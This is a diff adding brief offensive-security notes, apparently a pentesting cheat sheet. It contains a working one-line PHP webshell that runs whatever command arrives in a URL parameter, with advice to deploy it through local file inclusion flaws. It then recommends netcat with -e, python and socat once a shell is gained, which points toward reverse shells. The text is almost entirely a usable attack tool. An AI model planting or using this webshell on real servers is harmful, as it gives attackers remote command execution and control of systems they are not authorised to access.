@@ -1,0 +1,12 @@
+
+
+/usr/share/webshells
+
+
+Basic PHP Webshell
+Use it in LFI vulns
+
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+Once you have a shell, use "which" to search for tools
+netcat with -e, python, and Socat are your friends
